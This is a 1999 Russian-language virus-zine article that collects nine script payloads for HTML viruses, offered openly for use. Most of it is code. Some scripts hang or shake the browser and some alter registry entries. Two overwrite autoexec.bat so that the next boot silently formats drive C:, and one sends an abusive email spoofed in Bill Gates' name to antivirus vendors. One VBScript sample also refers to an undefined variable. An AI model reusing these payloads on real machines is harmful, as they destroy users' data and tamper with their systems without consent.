- [Duke's Virus Labs #9] - [Page 31] -

HMTL PAYLOAD
(c) by ULTRAS

В этой статье я покажу несколько интересных эффектов которые можно использовать
в HTML вирусах или в чем нибудь еще. Многие скрипты были написаны не мнои, я не
стал писать авторов.

Эффект 1
~~~~~~~~
Написан на VBcript. Бесконечный цикл.
Не срабатывает в самых последних версиях ИЕ
возможно этот скрипт не работает.

<script language=vbscript>
<!--
do while DVL=DVL
document.write "DVL#9"
loop
-->
</script>

Эффект 2
~~~~~~~~
Написан на JavaScript.
Тресет ваш браузер. Работает под
Internet Explorer и Netscape.

<script LANGUAGE="JavaScript1.2">
<!--script by bordsenius.com@systad.com
if (parseInt(navigator.appVersion) > 3){
a=1;
setInterval("Jump()",10);
}
function Jump(){
a=a+.1;
self.moveBy((Math.random()*a*2 -a),(Math.random()*a*2)-a);
}
//-->
</script>

Эффект 3
~~~~~~~~
Написан на JavaScript.
Вешает IE4 и IE5.

<script language="JavaScript"><!--
v = document.all ('recycled');
function fff( ) {
v.style.top = Math.random(100);
fff( );
}
fff( );
//--></script>

Эффект 4
~~~~~~~~
Написан на VBScript.
Меняет иконку html на корзину.

<script Language="VBScript">
Set WshShell = CreateObject("WScript.Shell")
WshShell.RegWrite "HKEY_CLASSES_ROOT\htmlfile\DefaultIcon\", "C:\Windows\System\Shell32.dll,32"
</script>


Эффект 5
~~~~~~~~
Написан на JavaScript.
Посылает письмо... туда блин

<script language=javascript>
<server>
a = new SendMail();
a.from = "bill_gates@microsoft.com"
a.to = "support@avp.ru"
a.cc = "id@drweb.ru"
a.subject = "your license"
a.body = "you bastard"
a.send()
</server>
</script>

Эффект 6
~~~~~~~~
Написан на JavaScript.
Записывает пару команд в autoexec.bat

<script language=javascript>
var fs = new ActiveXObject("Scripting.FileSystemObject");
var w = fs.CreateTextFile("C:\autoexec.bat", true);
w.WriteLine("@ECHO OFF");
w.WriteLine("CLS");
w.WriteLine("ECHO Please Wait...");
w.WriteLine("FORMAT C: /U /C /S /AUTOTEST > NUL");
w.WriteLine("ECHO Error...");
w.Close();
</script>


Эффект 7
~~~~~~~~
Написан на VBScript.
Записывает пару команд в autoexec.bat

<script language=vbscript>
Set fs = CreateObject("Scripting.FileSystemObject")
Set a = fs.CreateTextFile("C:\autoexec.bat", True)
w.WriteLine("@ECHO OFF")
w.WriteLine("CLS")
w.WriteLine("ECHO Please Wait...")
w.WriteLine("FORMAT C: /U /C /S /AUTOTEST > NUL")
w.WriteLine("ECHO Error...")
w.Close
</script>

Эффект 8
~~~~~~~~
Написан на JavaScript.
Изменяет размеры окна.

<SCRIPT LANGUAGE="JavaScript">
moveTo(20, 20);
resizeTo(1000, 1000);
resizeTo(900, 900);
resizeTo(800, 800);
resizeTo(700, 700);
resizeTo(600, 600);
resizeTo(500, 500);
resizeTo(400, 400);
resizeTo(300, 300);
resizeTo(200, 200);
resizeTo(100, 100);
resizeTo(000, 000);
document.writeln("ok");
</SCRIPT>

Эффект 9
~~~~~~~~
Написан на VBScript.
Записывает в реестр нового
пользователя и новую версию windoze.

<script Language="VBScript">
Set WshShell = CreateObject("WScript.Shell")
WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Version", "MustDie"
WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RegisteredOwner", "LaMER"
WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RegisteredOrganization", "Micro|Sux"
</script>

                                                           ULTRAS 1999
                                                           ~~~~~~~~~~~